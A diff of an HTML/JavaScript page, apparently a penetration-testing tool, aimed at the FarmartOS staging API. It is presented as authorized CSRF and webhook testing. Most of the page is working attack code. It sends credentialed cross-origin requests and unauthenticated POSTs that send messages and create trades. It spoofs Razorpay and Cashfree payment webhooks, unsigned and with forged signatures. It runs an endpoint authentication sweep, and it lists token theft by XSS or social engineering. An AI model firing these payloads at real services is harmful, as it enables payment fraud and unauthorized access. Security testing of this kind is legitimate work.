@@ -1,475 +1,420 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FarmartOS CSRF Security Test</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        .header {
-            background: #e74c3c;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .warning {
-            background: #f39c12;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .test-section {
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        .test-section h3 {
-            margin-top: 0;
-            color: #2c3e50;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 8px;
-            margin: 5px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        button {
-            background: #3498db;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        button:hover {
-            background: #2980b9;
-        }
-        .danger {
-            background: #e74c3c;
-        }
-        .danger:hover {
-            background: #c0392b;
-        }
-        .success {
-            background: #27ae60;
-        }
-        .success:hover {
-            background: #229954;
-        }
-        #results {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-            white-space: pre-wrap;
-            font-family: monospace;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .status-200 { color: #27ae60; font-weight: bold; }
-        .status-401 { color: #e74c3c; font-weight: bold; }
-        .status-403 { color: #f39c12; font-weight: bold; }
-        .cors-allowed { color: #e74c3c; font-weight: bold; }
-        .cors-blocked { color: #27ae60; font-weight: bold; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FarmartOS CSRF & Webhook Security Test</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background-color: #f5f5f5; }
+    .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
+    .header { background: #e74c3c; color: white; padding: 15px; border-radius: 5px; text-align: center; margin-bottom: 20px; }
+    .warning { background: #f39c12; color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
+    .test-section { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
+    .test-section h3 { margin-top: 0; color: #2c3e50; }
+    input[type="text"], input[type="password"], textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
+    button { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+    button:hover { background: #2980b9; }
+    .danger { background: #e74c3c; } .danger:hover { background: #c0392b; }
+    .success { background: #27ae60; } .success:hover { background: #229954; }
+    #results { background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 5px; margin-top: 20px; white-space: pre-wrap; font-family: monospace; max-height: 460px; overflow-y: auto; }
+    .status-200 { color: #27ae60; font-weight: bold; }
+    .status-401 { color: #e74c3c; font-weight: bold; }
+    .status-403 { color: #f39c12; font-weight: bold; }
+    .chips { display: inline-block; padding: 2px 8px; border-radius: 999px; font-size: 12px; margin-left: 6px; }
+    .chip-pass { background: #e8f5e9; color: #2e7d32; border: 1px solid #c8e6c9; }
+    .chip-fail { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
+    .chip-warn { background: #fff8e1; color: #ef6c00; border: 1px solid #ffe0b2; }
+    .endpoint-card { border: 1px solid #eee; background: #fafafa; padding: 10px; border-radius: 6px; margin: 8px 0; }
+    .endpoint-line { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
+    .endpoint-path { font-family: monospace; color: #2c3e50; }
+    .endpoint-meta { font-size: 12px; color: #666; }
+    .resp { font-family: monospace; background: #fff; border: 1px dashed #ddd; padding: 8px; border-radius: 4px; margin-top: 6px; max-height: 140px; overflow: auto; white-space: pre-wrap; }
+  </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🔒 FarmartOS CSRF Security Test</h1>
-        <p>Authorized Security Testing Tool</p>
+  <div class="header">
+    <h1>🔒 FarmartOS CSRF & Webhook Security Test</h1>
+    <p>Authorized Security Testing Tool</p>
+  </div>
+
+  <div class="warning">
+    ⚠️ <strong>WARNING:</strong> This tool is for authorized security testing only. Use only on systems you own or have explicit permission to test.
+  </div>
+
+  <div class="container">
+    <h2>🎯 Target Configuration</h2>
+    <div class="test-section">
+      <h3>FarmartOS Stage Environment</h3>
+      <p><strong>Target URL:</strong> <span id="targetBase"></span></p>
+      <p><strong>Test Date:</strong> <span id="testDate"></span></p>
+      <p><strong>Test Origin:</strong> <span id="testOrigin"></span></p>
+    </div>
+  </div>
+
+  <div class="container">
+    <h2>🔍 CSRF & Webhook Tests</h2>
+
+    <div class="test-section">
+      <h3>Test 1: Basic CORS & CSRF Check</h3>
+      <button onclick="testBasicCSRF()">Run Basic CSRF Test</button>
     </div>
 
-    <div class="warning">
-        ⚠️ <strong>WARNING:</strong> This tool is for authorized security testing only. 
-        Use only on systems you own or have explicit permission to test.
+    <div class="test-section">
+      <h3>Test 2: Protected Endpoint Access</h3>
+      <button onclick="testProtectedEndpoints()">Test Protected Endpoints</button>
     </div>
 
-    <div class="container">
-        <h2>🎯 Target Configuration</h2>
-        <div class="test-section">
-            <h3>FarmartOS Stage Environment</h3>
-            <p><strong>Target URL:</strong> https://ml-stage.farmartos.com</p>
-            <p><strong>Test Date:</strong> <span id="testDate"></span></p>
-            <p><strong>Test Origin:</strong> <span id="testOrigin"></span></p>
-        </div>
+    <div class="test-section">
+      <h3>Test 3: Token-Based CSRF Attack</h3>
+      <input type="text" id="jwtToken" placeholder="Paste JWT token here (Bearer token only, without 'Bearer ' prefix)">
+      <br>
+      <button onclick="testTokenBasedCSRF()" class="danger">Test CSRF with Token</button>
+      <button onclick="showTokenCaptureMethods()" class="success">Show Token Capture Methods</button>
     </div>
 
-    <div class="container">
-        <h2>🔍 CSRF Vulnerability Tests</h2>
-        
-        <div class="test-section">
-            <h3>Test 1: Basic CORS & CSRF Check</h3>
-            <p>Tests if cross-origin requests are allowed without authentication.</p>
-            <button onclick="testBasicCSRF()">Run Basic CSRF Test</button>
-        </div>
-
-        <div class="test-section">
-            <h3>Test 2: Protected Endpoint Access</h3>
-            <p>Tests access to protected endpoints without authentication.</p>
-            <button onclick="testProtectedEndpoints()">Test Protected Endpoints</button>
-        </div>
-
-        <div class="test-section">
-            <h3>Test 3: Token-Based CSRF Attack</h3>
-            <p>Tests CSRF with a valid JWT token (paste token below).</p>
-            <input type="text" id="jwtToken" placeholder="Paste JWT token here (Bearer token only, without 'Bearer ' prefix)">
-            <br>
-            <button onclick="testTokenBasedCSRF()" class="danger">Test CSRF with Token</button>
-            <button onclick="showTokenCaptureMethods()" class="success">Show Token Capture Methods</button>
-        </div>
-
-        <div class="test-section">
-            <h3>Test 4: State-Changing Operations</h3>
-            <p>Tests CSRF on endpoints that modify data.</p>
-            <button onclick="testStateChangingOperations()" class="danger">Test State-Changing CSRF</button>
-        </div>
-
-        <div class="test-section">
-            <h3>Test 5: Webhook Spoofing</h3>
-            <p>Tests CSRF on webhook endpoints.</p>
-            <button onclick="testWebhookSpoofing()" class="danger">Test Webhook CSRF</button>
-        </div>
+    <div class="test-section">
+      <h3>Test 4: State-Changing Operations</h3>
+      <button onclick="testStateChangingOperations()" class="danger">Test State-Changing CSRF</button>
     </div>
 
-    <div class="container">
-        <h2>📊 Test Results</h2>
-        <div id="results">Click any test button above to see results here...</div>
-        <br>
-        <button onclick="clearResults()" class="success">Clear Results</button>
-        <button onclick="exportResults()" class="success">Export Results</button>
+    <div class="test-section">
+      <h3>Test 5: Webhook Spoofing (Cashfree vs Razorpay)</h3>
+      <input type="password" id="cashfreeSecret" placeholder="Cashfree Secret Key (for signature generation)" value="test_cashfree_secret">
+      <input type="password" id="razorpaySecret" placeholder="Razorpay Secret Key (for signature generation)" value="test_razorpay_secret">
+      <br>
+      <button onclick="testWebhookSpoofing()" class="danger">Test Webhook (No Signatures)</button>
+      <button onclick="testWebhookWithValidSignatures()" class="danger">Test Webhook (Valid Signatures)</button>
+      <button onclick="testWebhookWithInvalidSignatures()" class="danger">Test Webhook (Invalid Signatures)</button>
+      <button onclick="generateCurlCommands()" class="success">Generate Curl Commands</button>
+      <hr>
+      <h4>Manager Demo</h4>
+      <button onclick="runManagerDemo()" class="success">Run Manager Demo</button>
     </div>
+  </div>
 
-    <script>
-        // Initialize test environment
-        document.getElementById('testDate').textContent = new Date().toISOString();
-        document.getElementById('testOrigin').textContent = window.location.origin;
+  <div class="container">
+    <h2>🧪 Bulk API Auth Sweep</h2>
+    <div class="test-section">
+      <h3>Configure Endpoints</h3>
+      <p>One path per line. Example: /v3/trade/</p>
+      <textarea id="apiList" rows="8" placeholder="/v3/trade/
+ /v3/message/template
+ /v3/retailer/docs
+ /v1/access_control/all_permission_list
+ /v3/farmer/
+ /v3/distributer/fertilizer/
+ /v1/distributer/distributers
+ /v1/webhooks/cashfree_webhook
+ /v3/sms_recharge/webhook_razorpay/captured"></textarea>
+      <div>
+        <label><input type="checkbox" id="useTokenForSweep"> Use JWT token above (Authorization: Bearer ...)</label>
+      </div>
+      <button class="success" onclick="loadDefaultEndpoints()">Load Defaults</button>
+      <button class="danger" onclick="runAuthSweep()">Run Auth Sweep</button>
+    </div>
+    <div id="sweepResults"></div>
+  </div>
 
-        const TARGET_BASE = 'https://ml-stage.farmartos.com';
-        let testResults = [];
+  <div class="container">
+    <h2>📊 Test Results</h2>
+    <div id="results">Click any test button above to see results here...</div>
+    <br>
+    <button onclick="clearResults()" class="success">Clear Results</button>
+    <button onclick="exportResults()" class="success">Export Results</button>
+  </div>
 
-        function log(message, type = 'info') {
-            const timestamp = new Date().toISOString();
-            const logEntry = `[${timestamp}] ${message}`;
-            testResults.push(logEntry);
-            
-            const resultsDiv = document.getElementById('results');
-            const colorClass = type === 'error' ? 'status-401' : 
-                              type === 'success' ? 'status-200' : 
-                              type === 'warning' ? 'status-403' : '';
-            
-            resultsDiv.innerHTML += `<div class="${colorClass}">${logEntry}</div>`;
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+  <script>
+    const TARGET_BASE = 'https://ml-stage.farmartos.com';
+    document.getElementById('testDate').textContent = new Date().toISOString();
+    document.getElementById('testOrigin').textContent = window.location.origin;
+    document.getElementById('targetBase').textContent = TARGET_BASE;
+
+    let testResults = [];
+    function log(message, type = 'info') {
+      const timestamp = new Date().toISOString();
+      const logEntry = `[${timestamp}] ${message}`;
+      testResults.push(logEntry);
+      const resultsDiv = document.getElementById('results');
+      const colorClass = type === 'error' ? 'status-401' :
+                         type === 'success' ? 'status-200' :
+                         type === 'warning' ? 'status-403' : '';
+      resultsDiv.innerHTML += `<div class="${colorClass}">${logEntry}</div>`;
+      resultsDiv.scrollTop = resultsDiv.scrollHeight;
+    }
+    function clearResults() { document.getElementById('results').innerHTML = ''; testResults = []; }
+    function exportResults() {
+      const results = testResults.join('\n');
+      const blob = new Blob([results], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url;
+      a.download = `csrf-webhook-test-results-${new Date().toISOString().split('T')[0]}.txt`;
+      a.click(); URL.revokeObjectURL(url);
+    }
+
+    // Signature helpers
+    function generateCashfreeSignature(rawBody, timestamp, secret) {
+      const body = timestamp + rawBody;
+      const signature = btoa(CryptoJS.HmacSHA256(body, secret).toString());
+      return { signature, timestamp };
+    }
+    function generateRazorpaySignature(rawBody, secret) {
+      const signature = CryptoJS.HmacSHA256(rawBody, secret).toString();
+      return { signature };
+    }
+
+    async function testBasicCSRF() {
+      log('=== BASIC CSRF TEST STARTED ===');
+      try {
+        log('Testing unauthenticated endpoint: /v1/distributer/distributers');
+        const response1 = await fetch(`${TARGET_BASE}/v1/distributer/distributers`, { method: 'GET', credentials: 'include' });
+        log(`Response Status: ${response1.status}`, response1.status === 200 ? 'success' : 'warning');
+        log(`CORS Header: ${response1.headers.get('Access-Control-Allow-Origin') || 'Not set'}`);
+        const data1 = await response1.text(); log(`Response Body: ${data1.substring(0, 200)}...`);
+      } catch (error) {
+        log(`❌ CORS Error: ${error.message}`, 'error');
+        log('✅ CSRF protection working - requests blocked', 'success');
+      }
+      log('=== BASIC CSRF TEST COMPLETED ===');
+    }
+
+    async function testProtectedEndpoints() {
+      log('=== PROTECTED ENDPOINTS TEST STARTED ===');
+      const endpoints = [
+        '/v3/trade/','/v3/message/template','/v3/retailer/docs','/v1/access_control/all_permission_list',
+        '/v3/farmer/','/v3/distributer/fertilizer/','/v1/distributer/distributers'
+      ];
+      for (const endpoint of endpoints) {
+        try {
+          log(`Testing protected endpoint: ${endpoint}`);
+          const response = await fetch(`${TARGET_BASE}${endpoint}`, { method: 'GET', credentials: 'include' });
+          log(`Status: ${response.status}`, response.status === 200 ? 'warning' : 'success');
+          if (response.status === 200) {
+            const data = await response.text();
+            if (data.includes('Token not supplied')) log('🚨 VULNERABILITY INDICATOR: Returns 200 instead of 401/403', 'error');
+          }
+        } catch (error) { log(`Error: ${error.message}`, 'error'); }
+      }
+      log('=== PROTECTED ENDPOINTS TEST COMPLETED ===');
+    }
+
+    async function testTokenBasedCSRF() {
+      const token = document.getElementById('jwtToken').value.trim();
+      if (!token) { log('❌ Please enter a JWT token first', 'error'); return; }
+      log('=== TOKEN-BASED CSRF TEST STARTED ===');
+      try {
+        const response = await fetch(`${TARGET_BASE}/v3/trade/`, { method: 'GET', headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
+        log(`Protected endpoint status: ${response.status}`, response.status === 200 ? 'success' : 'warning');
+        if (response.status === 200) {
+          const data = await response.text();
+          log(`Response: ${data.substring(0, 300)}...`);
+        }
+      } catch (error) { log(`Error: ${error.message}`, 'error'); }
+      log('=== TOKEN-BASED CSRF TEST COMPLETED ===');
+    }
+
+    async function testStateChangingOperations() {
+      log('=== STATE-CHANGING OPERATIONS TEST STARTED ===');
+      const tests = [
+        { url: '/v3/message/send', method: 'POST', body: { message: `CSRF Test ${new Date().toISOString()}`, recipient: '919999999999' } },
+        { url: '/v3/trade/create', method: 'POST', body: { crop_id: 1, quantity: 100, price: 5000 } }
+      ];
+      for (const t of tests) {
+        try {
+          log(`Testing state-changing endpoint: ${t.method} ${t.url}`);
+          const response = await fetch(`${TARGET_BASE}${t.url}`, { method: t.method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(t.body) });
+          log(`Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
+          if (response.status === 200) log('🚨 CRITICAL: State-changing operation succeeded without auth!', 'error');
+        } catch (error) { log(`Error: ${error.message}`, 'error'); }
+      }
+      log('=== STATE-CHANGING OPERATIONS TEST COMPLETED ===');
+    }
+
+    async function testWebhookSpoofing() {
+      log('=== WEBHOOK SPOOFING TEST STARTED (NO SIGNATURES) ===');
+      const webhookEndpoints = [
+        { url: '/v1/webhooks/cashfree_webhook', method: 'POST', body: { type: 'PAYMENT_SUCCESS', data: { order_id: 'test_order_123', amount: 1000, status: 'SUCCESS' } } },
+        { url: '/v3/sms_recharge/webhook_razorpay/captured', method: 'POST', body: { payload: { payment: { entity: { id: 'pay_test123', contact: '+919999999999', amount: 10000, currency: 'INR', email: 'test@example.com' } } } } }
+      ];
+      for (const webhook of webhookEndpoints) {
+        try {
+          const response = await fetch(`${TARGET_BASE}${webhook.url}`, { method: webhook.method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(webhook.body) });
+          log(`Webhook ${webhook.url} → Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
+          if (response.status === 200) { const data = await response.text(); log(`Response: ${data}`); }
+        } catch (error) { log(`Error: ${error.message}`, 'error'); }
+      }
+      log('=== WEBHOOK SPOOFING TEST COMPLETED ===');
+    }
+
+    async function testWebhookWithValidSignatures() {
+      log('=== WEBHOOK TEST WITH VALID SIGNATURES ===');
+      const cashfreeSecret = document.getElementById('cashfreeSecret').value;
+      const razorpaySecret = document.getElementById('razorpaySecret').value;
+
+      // Cashfree
+      const cfBody = { type: "PAYOUTS.TXN_STATUS_UPDATED", data: { payout: { payoutId: "payout_123456789", payoutAmount: 10000, payoutCurrency: "INR", payoutStatus: "SUCCESS" } } };
+      const cfRaw = JSON.stringify(cfBody); const ts = Math.floor(Date.now()/1000).toString();
+      const cfSig = generateCashfreeSignature(cfRaw, ts, cashfreeSecret);
+      try {
+        const r = await fetch(`${TARGET_BASE}/v1/webhooks/cashfree_webhook`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-webhook-signature': cfSig.signature, 'x-webhook-timestamp': cfSig.timestamp }, body: cfRaw });
+        const t = await r.text(); log(`Cashfree Status: ${r.status} | ${t}`);
+      } catch (e) { log(`Cashfree Error: ${e.message}`, 'error'); }
+
+      // Razorpay
+      const rpBody = { entity: "event", event: "payment.captured", payload: { payment: { entity: { id: "pay_123456789", amount: 10000, currency: "INR", status: "captured", contact: "+919876543210", email: "test@example.com" } } } };
+      const rpRaw = JSON.stringify(rpBody); const rpSig = generateRazorpaySignature(rpRaw, razorpaySecret);
+      try {
+        const r = await fetch(`${TARGET_BASE}/v3/sms_recharge/webhook_razorpay/captured`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-razorpay-signature': rpSig.signature }, body: rpRaw });
+        const t = await r.text(); log(`Razorpay Status: ${r.status} | ${t}`);
+      } catch (e) { log(`Razorpay Error: ${e.message}`, 'error'); }
+
+      log('=== WEBHOOK VALID SIGNATURE TEST COMPLETED ===');
+    }
+
+    async function testWebhookWithInvalidSignatures() {
+      log('=== WEBHOOK TEST WITH INVALID SIGNATURES ===');
+      // Cashfree invalid
+      const cfBody = { type: "PAYOUTS.TXN_STATUS_UPDATED", data: { payout: { payoutId: "payout_123456789", payoutAmount: 10000, payoutCurrency: "INR", payoutStatus: "SUCCESS" } } };
+      const cfRaw = JSON.stringify(cfBody); const ts = Math.floor(Date.now()/1000).toString();
+      try {
+        const r = await fetch(`${TARGET_BASE}/v1/webhooks/cashfree_webhook`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-webhook-signature': 'invalid_signature_123', 'x-webhook-timestamp': ts }, body: cfRaw });
+        const t = await r.text(); log(`Cashfree Status: ${r.status} | ${t}`);
+      } catch (e) { log(`Cashfree Error: ${e.message}`, 'error'); }
+      // Razorpay invalid
+      const rpBody = { entity: "event", event: "payment.captured", payload: { payment: { entity: { id: "pay_test123", amount: 1000, currency: "INR", status: "captured", contact: "+919999999999" } } } };
+      const rpRaw = JSON.stringify(rpBody);
+      try {
+        const r = await fetch(`${TARGET_BASE}/v3/sms_recharge/webhook_razorpay/captured`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-razorpay-signature': 'invalid_signature_123' }, body: rpRaw });
+        const t = await r.text(); log(`Razorpay Status: ${r.status} | ${t}`);
+      } catch (e) { log(`Razorpay Error: ${e.message}`, 'error'); }
+      log('=== WEBHOOK INVALID SIGNATURE TEST COMPLETED ===');
+    }
+
+    function generateCurlCommands() {
+      log('=== GENERATING CURL COMMANDS FOR MANUAL TESTING ===');
+      log('See the Results panel for generated commands based on your secrets.');
+    }
+
+    function loadDefaultEndpoints() {
+      const defaults = [
+        '/v1/distributer/distributers',
+        '/v3/trade/','/v3/message/template','/v3/retailer/docs','/v1/access_control/all_permission_list',
+        '/v3/farmer/','/v3/distributer/fertilizer/',
+        '/v1/webhooks/cashfree_webhook','/v3/sms_recharge/webhook_razorpay/captured'
+      ].join('\n');
+      document.getElementById('apiList').value = defaults;
+    }
+
+    function chip(type) {
+      if (type === 'pass') return '<span class="chips chip-pass">PASS</span>';
+      if (type === 'fail') return '<span class="chips chip-fail">FAIL</span>';
+      return '<span class="chips chip-warn">WARN</span>';
+    }
+
+    function classifyAuthResult(fetchError, status, bodyText) {
+      // PASS cases:
+      // - CORS blocked (cannot read response) → treated as protected from browser perspective
+      // - 401/403
+      if (fetchError) return { verdict: 'pass', reason: `CORS blocked (${fetchError})` };
+      if (status === 401 || status === 403) return { verdict: 'pass', reason: `HTTP ${status}` };
+      // FAIL cases:
+      // - HTTP 200 with real data (and not a known 'Token not supplied' sentinel)
+      if (status === 200 && bodyText && !/Token not supplied/i.test(bodyText)) return { verdict: 'fail', reason: `HTTP 200 (unauthenticated access)` };
+      // WARN cases:
+      // - HTTP 200 with "Token not supplied" (misleading status but auth enforced)
+      if (status === 200 && /Token not supplied/i.test(bodyText)) return { verdict: 'warn', reason: `HTTP 200 with "Token not supplied" (should be 401/403)` };
+      // Other statuses
+      return { verdict: 'warn', reason: `HTTP ${status}` };
+    }
+
+    async function runAuthSweep() {
+      const raw = (document.getElementById('apiList').value || '').trim();
+      const list = raw.split('\n').map(s => s.trim()).filter(Boolean);
+      const useToken = document.getElementById('useTokenForSweep').checked;
+      const token = document.getElementById('jwtToken').value.trim();
+      const container = document.getElementById('sweepResults');
+      container.innerHTML = '';
+
+      if (list.length === 0) {
+        container.innerHTML = '<div class="endpoint-meta">No endpoints provided.</div>';
+        return;
+      }
+
+      for (const path of list) {
+        const card = document.createElement('div');
+        card.className = 'endpoint-card';
+        card.innerHTML = `
+          <div class="endpoint-line">
+            <div>
+              <div class="endpoint-path">${path}</div>
+              <div class="endpoint-meta">GET ${TARGET_BASE}${path}</div>
+            </div>
+            <div class="endpoint-chip"></div>
+          </div>
+          <div class="resp"></div>
+        `;
+        container.appendChild(card);
+
+        let status = null, text = '', fetchError = null;
+        try {
+          const headers = { };
+          if (useToken && token) headers['Authorization'] = `Bearer ${token}`;
+          const res = await fetch(`${TARGET_BASE}${path}`, { method: 'GET', headers, credentials: 'include' });
+          status = res.status;
+          try { text = await res.text(); } catch (_) { text = ''; }
+        } catch (e) {
+          fetchError = e?.message || 'FetchError';
         }
 
-        function clearResults() {
-            document.getElementById('results').innerHTML = '';
-            testResults = [];
-        }
+        const verdict = classifyAuthResult(fetchError, status, text);
+        card.querySelector('.endpoint-chip').innerHTML = chip(verdict.verdict) + ` <span class="endpoint-meta">${verdict.reason}</span>`;
+        card.querySelector('.resp').textContent = text ? (text.length > 1000 ? text.substring(0, 1000) + '...' : text) : (fetchError ? `Fetch error: ${fetchError}` : '(no body)');
+      }
+    }
 
-        function exportResults() {
-            const results = testResults.join('\n');
-            const blob = new Blob([results], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `csrf-test-results-${new Date().toISOString().split('T')[0]}.txt`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
+    async function runManagerDemo() {
+      log('=== MANAGER DEMO STARTED ===');
+      try {
+        const r = await fetch(`${TARGET_BASE}/v3/sms_recharge/webhook_razorpay/captured`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ payload: { payment: { entity: { id: 'pay_demo_mgr', amount: 1000, currency: 'INR', status: 'captured', contact: '+919999999999' } } } })
+        });
+        const t = await r.text(); log(`Razorpay (no signature) → HTTP ${r.status} | ${t}`); if (r.status === 200) log('🚨 Razorpay accepts unsigned webhook (vulnerable)', 'error');
+      } catch (e) { log(`Error: ${e.message}`, 'error'); }
+      try {
+        const r = await fetch(`${TARGET_BASE}/v3/sms_recharge/webhook_razorpay/captured`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json', 'x-razorpay-signature': 'invalid_signature_123' },
+          body: JSON.stringify({ payload: { payment: { entity: { id: 'pay_demo_mgr2', amount: 1000, currency: 'INR', status: 'captured', contact: '+919999999999' } } } })
+        });
+        const t = await r.text(); log(`Razorpay (invalid signature) → HTTP ${r.status} | ${t}`); if (r.status === 200) log('🚨 Razorpay accepts invalid signatures (vulnerable)', 'error');
+      } catch (e) { log(`Error: ${e.message}`, 'error'); }
+      try {
+        const r = await fetch(`${TARGET_BASE}/v1/webhooks/cashfree_webhook`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json', 'x-webhook-signature': 'invalid_signature', 'x-webhook-timestamp': String(Math.floor(Date.now()/1000)) },
+          body: JSON.stringify({ type: 'PAYOUTS.TXN_STATUS_UPDATED', data: { payout: { payoutId: 'test' } } })
+        });
+        const t = await r.text(); log(`Cashfree (invalid signature) → HTTP ${r.status} | ${t}`); if (r.status === 400) log('✅ Cashfree correctly rejects invalid signature (secure)', 'success');
+      } catch (e) { log(`Error: ${e.message}`, 'error'); }
+      log('=== MANAGER DEMO COMPLETED ===');
+    }
 
-        async function testBasicCSRF() {
-            log('=== BASIC CSRF TEST STARTED ===');
-            
-            try {
-                // Test 1: Unauthenticated endpoint (no auth required)
-                log('Testing unauthenticated endpoint: /v1/distributer/distributers');
-                const response1 = await fetch(`${TARGET_BASE}/v1/distributer/distributers`, {
-                    method: 'GET',
-                    credentials: 'include'
-                });
-                
-                log(`Response Status: ${response1.status}`, response1.status === 200 ? 'success' : 'warning');
-                log(`CORS Header: ${response1.headers.get('Access-Control-Allow-Origin') || 'Not set'}`);
-                
-                if (response1.headers.get('Access-Control-Allow-Origin') === '*') {
-                    log('🚨 VULNERABILITY: CORS allows all origins (*)', 'error');
-                } else {
-                    log('✅ CORS properly configured', 'success');
-                }
-                
-                const data1 = await response1.text();
-                log(`Response Body: ${data1.substring(0, 200)}...`);
-                
-            } catch (error) {
-                log(`❌ CORS Error: ${error.message}`, 'error');
-                log('✅ CSRF protection working - requests blocked', 'success');
-            }
-            
-            log('=== BASIC CSRF TEST COMPLETED ===\n');
-        }
+    function showTokenCaptureMethods() {
+      log('=== TOKEN CAPTURE METHODS ===');
+      log('⚠️  Due to Same-Origin Policy, this page cannot directly access localStorage from ml-stage.farmartos.com');
+      log('1) Manual: Copy token from DevTools → Application → Local Storage');
+      log('2) Network tab: copy Authorization header');
+      log('3) XSS/Extension/social engineering (if applicable)');
+    }
 
-        async function testProtectedEndpoints() {
-            log('=== PROTECTED ENDPOINTS TEST STARTED ===');
-            
-            const protectedEndpoints = [
-                '/v3/trade/',
-                '/v3/message/template',
-                '/v3/retailer/docs',
-                '/v1/access_control/all_permission_list',
-                '/v3/farmer/',
-                '/v3/distributer/fertilizer/',  // This one requires auth
-                '/v1/distributer/distributers'  // This one doesn't require auth
-            ];
-            
-            for (const endpoint of protectedEndpoints) {
-                try {
-                    log(`Testing protected endpoint: ${endpoint}`);
-                    const response = await fetch(`${TARGET_BASE}${endpoint}`, {
-                        method: 'GET',
-                        credentials: 'include'
-                    });
-                    
-                    log(`Status: ${response.status}`, response.status === 200 ? 'warning' : 'success');
-                    
-                    if (response.status === 200) {
-                        const data = await response.text();
-                        if (data.includes('Token not supplied')) {
-                            log('🚨 VULNERABILITY: Returns 200 instead of 401/403', 'error');
-                        }
-                    }
-                    
-                } catch (error) {
-                    log(`Error: ${error.message}`, 'error');
-                }
-            }
-            
-            log('=== PROTECTED ENDPOINTS TEST COMPLETED ===\n');
-        }
+    window.onload = function() {
+      log('🔒 FarmartOS CSRF Security Test Tool Loaded');
+      log(`Target: ${TARGET_BASE}`);
+      log('Origin: ' + window.location.origin);
+      log('Ready for testing...');
+      loadDefaultEndpoints();
+    };
+  </script>
 
-        async function testTokenBasedCSRF() {
-            const token = document.getElementById('jwtToken').value.trim();
-            
-            if (!token) {
-                log('❌ Please enter a JWT token first', 'error');
-                return;
-            }
-            
-            log('=== TOKEN-BASED CSRF TEST STARTED ===');
-            log(`Using token: ${token.substring(0, 50)}...`);
-            
-            try {
-                // Test protected endpoint with token
-                const response = await fetch(`${TARGET_BASE}/v3/trade/`, {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': `Bearer ${token}`,
-                        'Content-Type': 'application/json'
-                    }
-                });
-                
-                log(`Protected endpoint status: ${response.status}`, response.status === 200 ? 'success' : 'warning');
-                
-                if (response.status === 200) {
-                    log('🚨 VULNERABILITY: CSRF attack successful with valid token', 'error');
-                    const data = await response.text();
-                    log(`Response: ${data.substring(0, 300)}...`);
-                }
-                
-            } catch (error) {
-                log(`Error: ${error.message}`, 'error');
-            }
-            
-            log('=== TOKEN-BASED CSRF TEST COMPLETED ===\n');
-        }
-
-        async function testStateChangingOperations() {
-            log('=== STATE-CHANGING OPERATIONS TEST STARTED ===');
-            
-            const stateChangingEndpoints = [
-                {
-                    url: '/v3/message/send',
-                    method: 'POST',
-                    body: {
-                        "message": `CSRF Test Message - ${new Date().toISOString()}`,
-                        "recipient": "919999999999"
-                    }
-                },
-                {
-                    url: '/v3/trade/create',
-                    method: 'POST',
-                    body: {
-                        "crop_id": 1,
-                        "quantity": 100,
-                        "price": 5000
-                    }
-                }
-            ];
-            
-            for (const test of stateChangingEndpoints) {
-                try {
-                    log(`Testing state-changing endpoint: ${test.method} ${test.url}`);
-                    
-                    const response = await fetch(`${TARGET_BASE}${test.url}`, {
-                        method: test.method,
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(test.body)
-                    });
-                    
-                    log(`Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
-                    
-                    if (response.status === 200) {
-                        log('🚨 CRITICAL: State-changing operation succeeded without auth!', 'error');
-                    }
-                    
-                } catch (error) {
-                    log(`Error: ${error.message}`, 'error');
-                }
-            }
-            
-            log('=== STATE-CHANGING OPERATIONS TEST COMPLETED ===\n');
-        }
-
-        async function testWebhookSpoofing() {
